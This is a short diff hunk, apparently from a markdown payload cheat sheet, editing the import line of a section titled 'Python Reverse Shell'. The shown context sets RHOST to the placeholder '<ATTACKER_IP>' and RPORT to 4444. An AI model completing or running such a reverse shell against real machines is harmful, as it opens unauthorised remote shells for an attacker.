@@ -407,7 +407,7 @@ return(0);
 ## Python Reverse Shell
 
 ```python
-import sys, socket, os, pty
+import socket,os,pty
 
 RHOST = "<ATTACKER_IP>"
 RPORT = 4444
